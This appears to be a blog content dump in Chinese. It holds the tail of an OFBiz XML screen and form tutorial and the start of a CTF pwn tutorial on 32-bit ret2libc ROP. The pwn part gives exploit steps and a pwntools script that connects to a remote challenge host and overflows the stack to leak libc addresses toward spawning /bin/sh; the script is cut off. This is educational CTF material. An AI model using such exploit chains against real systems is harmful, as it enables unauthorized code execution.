<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">request-map</span> <span class="attr">uri</span>=<span class="string">&quot;ViewProductPlan&quot;</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">security</span> <span class="attr">https</span>=<span class="string">&quot;true&quot;</span> <span class="attr">auth</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;view&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ViewProductPlan&quot;</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">request-map</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">view-map</span> <span class="attr">name</span>=<span class="string">&quot;ViewProductPlan&quot;</span> <span class="attr">type</span>=<span class="string">&quot;screen&quot;</span> <span class="attr">page</span>=<span class="string">&quot;component://learning/widget/learningScreens.xml#ViewProductPlan&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>（2）learningScreens.xml:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">screen</span> <span class="attr">name</span>=<span class="string">&quot;ViewProductPlan&quot;</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">section</span>&gt;</span></span><br><span class="line">	    	<span class="tag">&lt;<span class="name">actions</span>&gt;</span></span><br><span class="line">	    		<span class="comment">&lt;!-- 接受list表单传进来的parameter参数 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">set</span> <span class="attr">field</span>=<span class="string">&quot;ProductPlanId&quot;</span> <span class="attr">from-field</span>=<span class="string">&quot;parameters.ProductPlanId&quot;</span>/&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- 以下这句话非常关键？ --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">entity-one</span> <span class="attr">entity-name</span>=<span class="string">&quot;ProductPlan&quot;</span> <span class="attr">value-field</span>=<span class="string">&quot;ProductPlan&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">actions</span>&gt;</span></span><br><span class="line">	        <span class="tag">&lt;<span class="name">widgets</span>&gt;</span></span><br><span class="line">	            <span class="tag">&lt;<span class="name">decorator-screen</span> <span class="attr">name</span>=<span class="string">&quot;CommonRoutingDecorator&quot;</span> <span class="attr">location</span>=<span class="string">&quot;component://manufacturing/widget/manufacturing/RoutingScreens.xml&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">decorator-section</span> <span class="attr">name</span>=<span class="string">&quot;body&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">screenlet</span> <span class="attr">title</span>=<span class="string">&quot;生产计划表&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">container</span> <span class="attr">style</span>=<span class="string">&quot;button-bar&quot;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">link</span> <span class="attr">target</span>=<span class="string">&quot;FindProductPlan&quot;</span> <span class="attr">text</span>=<span class="string">&quot;返回&quot;</span> <span class="attr">style</span>=<span class="string">&quot;buttontext&quot;</span>/&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">container</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">include-form</span> <span class="attr">name</span>=<span class="string">&quot;ViewProductPlan&quot;</span> <span class="attr">location</span>=<span class="string">&quot;component://learning/widget/learningForms.xml&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">include-form</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">screenlet</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">decorator-section</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">decorator-screen</span>&gt;</span></span><br><span class="line">	        <span class="tag">&lt;/<span class="name">widgets</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">screen</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>表单的actions预处理动作，保证了显示表单中的数据项是传进来的ProductPlanId的数据项（虽然笔者也不知为何？）。</p>
<p>（3）learningForms.xml:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;ViewProductPlan&quot;</span> <span class="attr">type</span>=<span class="string">&quot;single&quot;</span> <span class="attr">target</span>=<span class="string">&quot;EditProductPlan&quot;</span> <span class="attr">title</span>=<span class="string">&quot;&quot;</span> <span class="attr">default-map-name</span>=<span class="string">&quot;ProductPlan&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;productPlanId&quot;</span> <span class="attr">tooltip</span>=<span class="string">&quot;&quot;</span> <span class="attr">title</span>=<span class="string">&quot;&quot;</span> <span class="attr">position</span>=<span class="string">&quot;1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">text</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;itemId&quot;</span> <span class="attr">position</span>=<span class="string">&quot;2&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">lookup</span> <span class="attr">target-form-name</span>=<span class="string">&quot;LookupProductPlanItem&quot;</span> <span class="attr">size</span>=<span class="string">&quot;16&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;startTime&quot;</span> <span class="attr">position</span>=<span class="string">&quot;1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">text</span> <span class="attr">type</span>=<span class="string">&quot;date&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;finishTime&quot;</span> <span class="attr">position</span>=<span class="string">&quot;2&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">text</span> <span class="attr">type</span>=<span class="string">&quot;date&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;principleId&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">lookup</span> <span class="attr">target-form-name</span>=<span class="string">&quot;LookupProductPlanPerson&quot;</span> <span class="attr">size</span>=<span class="string">&quot;16&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;division&quot;</span> <span class="attr">position</span>=<span class="string">&quot;2&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">text</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;useProject&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">text</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;stageIdenf&quot;</span> <span class="attr">position</span>=<span class="string">&quot;2&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">text</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;tecnoDemand&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">text</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;preparationId&quot;</span> <span class="attr">position</span>=<span class="string">&quot;2&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">lookup</span> <span class="attr">target-form-name</span>=<span class="string">&quot;LookupProductPlanPreparation&quot;</span> <span class="attr">size</span>=<span class="string">&quot;16&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;designDemand&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">text</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;product&quot;</span> <span class="attr">position</span>=<span class="string">&quot;2&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">text</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;outCheck&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">text</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;documentPrepa&quot;</span> <span class="attr">position</span>=<span class="string">&quot;2&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">text</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;armyCheck&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">text</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;outJudge&quot;</span> <span class="attr">position</span>=<span class="string">&quot;2&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">text</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;sureCompile&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">text</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;sureJudge&quot;</span> <span class="attr">position</span>=<span class="string">&quot;2&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">text</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;sureApprove&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">text</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;departmentId&quot;</span> <span class="attr">position</span>=<span class="string">&quot;2&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">text</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;submitButton&quot;</span> <span class="attr">title</span>=<span class="string">&quot;修改&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">submit</span> <span class="attr">button-type</span>=<span class="string">&quot;button&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在该表中，有几个要点：</p>
<ul>
<li><code>&lt;field&gt;</code>的属性position&#x3D;”2”是表示该数据项的左右位置（默认是1），但相邻的数据项之间不能都等于2（此处玄学，笔者不甚了解）；</li>
<li><code>&lt;text type=&quot;date&quot;&gt;</code>表示该数据项只显示日期；</li>
<li><code>&lt;lookup target-form-name=&quot;LookupProductPlanItem&quot; size=&quot;16&quot;/&gt;</code>是数据项的一种可以提供便捷查找功能的格式，其属性target对应一个请求（control&#x2F;LookupProductPlanItem），说明我们还要创建一个请求以及响应视图才能使用这个功能。</li>
</ul>
<p>（4）创建Lookup请求，在controller.xml中添加：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">request-map</span> <span class="attr">uri</span>=<span class="string">&quot;LookupProductPlanItem&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">security</span> <span class="attr">https</span>=<span class="string">&quot;true&quot;</span> <span class="attr">auth</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">response</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span> <span class="attr">type</span>=<span class="string">&quot;view&quot;</span> <span class="attr">value</span>=<span class="string">&quot;LookupProductPlanItem&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">request-map</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">view-map</span> <span class="attr">name</span>=<span class="string">&quot;LookupProductPlanItem&quot;</span> <span class="attr">type</span>=<span class="string">&quot;screen&quot;</span> <span class="attr">page</span>=<span class="string">&quot;component://learning/widget/LearningScreens.xml#LookupProductPlanItem&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p>（5）创建Lookup视图，在LearningScreens.xml中添加：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">screen</span> <span class="attr">name</span>=<span class="string">&quot;LookupProductPlanItem&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">section</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">condition</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">if-service-permission</span> <span class="attr">service-name</span>=<span class="string">&quot;catalogPermissionCheck&quot;</span> <span class="attr">main-action</span>=<span class="string">&quot;VIEW&quot;</span>/&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">condition</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">actions</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">set</span> <span class="attr">field</span>=<span class="string">&quot;title&quot;</span> <span class="attr">value</span>=<span class="string">&quot;查找项目&quot;</span>/&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">set</span> <span class="attr">field</span>=<span class="string">&quot;queryString&quot;</span> <span class="attr">from-field</span>=<span class="string">&quot;result.queryString&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">               <span class="tag">&lt;<span class="name">set</span> <span class="attr">field</span>=<span class="string">&quot;entityName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ProductPlanItem&quot;</span>/&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">set</span> <span class="attr">field</span>=<span class="string">&quot;searchFields&quot;</span> <span class="attr">value</span>=<span class="string">&quot;[id, name, category, secretLevel]&quot;</span>/&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">actions</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">widgets</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">decorator-screen</span> <span class="attr">name</span>=<span class="string">&quot;LookupDecorator&quot;</span> <span class="attr">location</span>=<span class="string">&quot;component://common/widget/CommonScreens.xml&quot;</span>&gt;</span></span><br><span class="line">                   <span class="tag">&lt;<span class="name">decorator-section</span> <span class="attr">name</span>=<span class="string">&quot;search-options&quot;</span>&gt;</span></span><br><span class="line">                   	<span class="tag">&lt;<span class="name">include-form</span> <span class="attr">name</span>=<span class="string">&quot;FindProductPlanItem&quot;</span> <span class="attr">location</span>=<span class="string">&quot;component://learning/widget/LearningForms.xml&quot;</span>/&gt;</span></span><br><span class="line">                   <span class="tag">&lt;/<span class="name">decorator-section</span>&gt;</span></span><br><span class="line">                   <span class="tag">&lt;<span class="name">decorator-section</span> <span class="attr">name</span>=<span class="string">&quot;search-results&quot;</span>&gt;</span></span><br><span class="line">                   	<span class="tag">&lt;<span class="name">include-form</span> <span class="attr">name</span>=<span class="string">&quot;ListProductPlanItem&quot;</span> <span class="attr">location</span>=<span class="string">&quot;component://learning/widget/LearningForms.xml&quot;</span>/&gt;</span></span><br><span class="line">                   <span class="tag">&lt;/<span class="name">decorator-section</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;/<span class="name">decorator-screen</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">widgets</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">screen</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>&lt;actions&gt;中的第三个&lt;set&gt;标签是指定具体数据库表；第四个是用来，在调用该Lookup功能的数据项旁，显示value中字段数据的。</p>
<p>（6）创建Form表单，在LearningForms.xml中添加：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;FindProductPlanItem&quot;</span> <span class="attr">type</span>=<span class="string">&quot;single&quot;</span> <span class="attr">target</span>=<span class="string">&quot;LookupProductPlanItem&quot;</span> <span class="attr">title</span>=<span class="string">&quot;&quot;</span> <span class="attr">default-map-name</span>=<span class="string">&quot;ProductPlanItem&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">header-row-style</span>=<span class="string">&quot;header-row&quot;</span> <span class="attr">default-table-style</span>=<span class="string">&quot;basic-table&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">title</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">text-find</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">text-find</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;category&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">text-find</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;submitButton&quot;</span> <span class="attr">title</span>=<span class="string">&quot;$&#123;uiLabelMap.CommonFind&#125;&quot;</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">submit</span> <span class="attr">button-type</span>=<span class="string">&quot;button&quot;</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">&lt;!-- ！！！一定要注意list-name必须是listIt --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;ListProductPlanItem&quot;</span> <span class="attr">type</span>=<span class="string">&quot;list&quot;</span> <span class="attr">list-name</span>=<span class="string">&quot;listIt&quot;</span></span></span><br><span class="line"><span class="tag">   	  <span class="attr">paginate-target</span>=<span class="string">&quot;LookupProductPlanItem&quot;</span> <span class="attr">default-entity-name</span>=<span class="string">&quot;ProductPlanItem&quot;</span></span></span><br><span class="line"><span class="tag">   	  <span class="attr">odd-row-style</span>=<span class="string">&quot;alternate-row&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">actions</span>&gt;</span></span><br><span class="line">       	<span class="tag">&lt;<span class="name">set</span> <span class="attr">field</span>=<span class="string">&quot;noConditionFind&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Y&quot;</span>/&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">service</span> <span class="attr">service-name</span>=<span class="string">&quot;performFind&quot;</span> <span class="attr">result-map</span>=<span class="string">&quot;result&quot;</span> <span class="attr">result-map-list</span>=<span class="string">&quot;listIt&quot;</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">field-map</span> <span class="attr">field-name</span>=<span class="string">&quot;inputFields&quot;</span> <span class="attr">from-field</span>=<span class="string">&quot;parameters&quot;</span>/&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">field-map</span> <span class="attr">field-name</span>=<span class="string">&quot;entityName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ProductPlanItem&quot;</span>/&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">actions</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!-- 以下是点击id后退出，并将点击的id显示id框中 --&gt;</span></span><br><span class="line">   	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">widget-style</span>=<span class="string">&quot;smallSubmit&quot;</span>&gt;</span></span><br><span class="line">       	<span class="tag">&lt;<span class="name">hyperlink</span> <span class="attr">also-hidden</span>=<span class="string">&quot;false&quot;</span> <span class="attr">target-type</span>=<span class="string">&quot;plain&quot;</span> <span class="attr">description</span>=<span class="string">&quot;$&#123;id&#125;&quot;</span> <span class="attr">target</span>=<span class="string">&quot;javascript:set_value(&#x27;$&#123;id&#125;&#x27;)&quot;</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">   	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">display</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">   	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;category&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">display</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">   	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;secretLevel&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">display</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">   	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;source&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">display</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">   	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;content&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">display</span>/&gt;</span><span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>（7）完工的ViewProductPlan视图<br><img src="/ofbiz%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%83%A8%E7%BD%B2%E7%BB%84%E4%BB%B61/ofbiz2.PNG" alt="ViewProductPlan"></p>
<h3 id="结语（本文结束的几个月后所添加的）"><a href="#结语（本文结束的几个月后所添加的）" class="headerlink" title="结语（本文结束的几个月后所添加的）"></a>结语（本文结束的几个月后所添加的）</h3><p>此处推荐一位ofbiz大神博客：<a href="http://ofbizer.iteye.com/blog/2386290">上海香飘飘</a>，博客中不仅有关于ofbiz的知识，有很多资源链接，读者可以下载阅读。其中就包括入门级指南<em>Apache+OFBiz+开发初学者指南[Ob4.0-EN+Ob9.0-CN].chm</em>。这份指南很全，若能认真反复阅读，必能获益匪浅。</p>
]]></content>
      <categories>
        <category>开发</category>
        <category>后端</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>后端</tag>
        <tag>Ofbiz</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn栈溢出-基本ROP</title>
    <url>/pwn%E5%85%A5%E9%97%A8-%E5%9F%BA%E6%9C%ACROP.html</url>
    <content><![CDATA[<p>[TOC]</p>
<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>接触ctf一年有余，作为一名ctf老菜鸟，没写过一篇ctf相关博客，确实不该。</p>
<p>本文介绍pwn入门操作————基本ROP，主要用于自我笔记，不包含详细原理细节。</p>
<span id="more"></span>

<h2 id="1-pwn入门"><a href="#1-pwn入门" class="headerlink" title="1. pwn入门"></a>1. pwn入门</h2><p>必备知识：</p>
<ul>
<li><p>python</p>
</li>
<li><p>汇编</p>
</li>
<li><p>链接</p>
</li>
</ul>
<p>推荐书籍：</p>
<ul>
<li>《深入理解计算机》第二、三、六、七、八、九章</li>
</ul>
<p>如果以上知识不牢固，相信我，你是根本pwn不动的。</p>
<h2 id="2-基本ROP"><a href="#2-基本ROP" class="headerlink" title="2. 基本ROP"></a>2. 基本ROP</h2><p>ROP(Return Oriented Programming)，属于栈溢出类型中的基本操作。</p>
<blockquote>
<p>之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件：<br>1.程序存在溢出，并且可以控制返回地址。<br>2.可以找到满足条件的 gadgets 以及相应 gadgets 的地址。</p>
</blockquote>
<p>更多介绍参见<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/">ctf-wiki</a></p>
<p>ROP中包含各种操作，如：<code>ret2text</code>、<code>ret2shellcode</code>等等。此处只介绍<code>ret2libc</code>————返回libc共享库，并执行<code>system(&quot;/bin/sh&quot;)</code>。</p>
<h3 id="2-1-32位ret2libc"><a href="#2-1-32位ret2libc" class="headerlink" title="2.1. 32位ret2libc"></a>2.1. 32位ret2libc</h3><p>大致步骤如下：</p>
<ol>
<li><p>发现溢出点，绕过代码中的关卡(可能没有)进行溢出。</p>
</li>
<li><p>通过溢出点，覆盖返回地址，执行<code>write()</code>或<code>puts()</code>函数。即将<code>plt</code>表中的<code>write\puts</code>函数地址，覆盖在返回地址处。还需将调用<code>write\puts</code>函数后的返回地址，设置为漏洞函数地址，从而实现反复利用。</p>
</li>
<li><p>利用<code>write\puts</code>函数，打印<code>got</code>表中某个库函数<strong>运行在内存中的地址</strong>(如:<code>read()</code>函数)。即将<code>got</code>表库函数作为<code>write\puts</code>函数的参数。</p>
</li>
<li><p>通过某个libc库函数运行地址，推测出libc库版本(通过<a href="http://libcdb.com/">libc search网站</a>，有些题目可能直接给出libc库)。然后，用该库函数的内存地址 - 该函数在libc库中的偏移地址 得到 libc库加载的内存地址。</p>
</li>
<li><p>得到libc库基地址后，便可以通过偏移得到<code>system()</code>函数和<code>\bin\sh</code>字符串的地址。</p>
</li>
<li><p>再次利用漏洞点，栈溢出执行<code>system(&#39;\bin\sh&#39;)</code>，拿到权限。</p>
</li>
</ol>
<p>示例代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./babyrop&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">r = remote(<span class="string">&#x27;47.112.137.238&#x27;</span>, <span class="string">&#x27;13337&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./babyrop&#x27;)</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">ret_func_addr = <span class="number">0x80487D0</span> <span class="comment"># sub_80487D0()函数地址</span></span><br><span class="line">test_str = <span class="number">0x08048937</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 绕过</span></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span> + <span class="string">&#x27;\xff&#x27;</span> * <span class="number">0x1f</span></span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 覆盖sub_80487D0()函数返回地址，调用puts函数，打印got表中read函数的地址，然后又返回到sub_80487D0()函数</span></span><br><span class="line"><span class="comment"># ret_func_addr 为 puts() 函数结束后的返回地址，read_got 为 puts() 函数的参数</span></span><br><span class="line"><span class="comment"># 0xffffffff 为即将传进 sub_80487D0() 的参数</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0xeb</span> + p32(puts_plt) + p32(ret_func_addr) + p32(read_got) + p32(<span class="number">0xffffffff</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取到read()函数的地址，然后计算共享库基地址等等</span></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line">read_addr = u32(r.recv()[:<span class="number">4</span>]) <span class="comment"># read()函数实际地址</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(read_addr)</span><br><span class="line">libc_base_addr = read_addr - libc.symbols[<span class="string">&#x27;read&#x27;</span>] <span 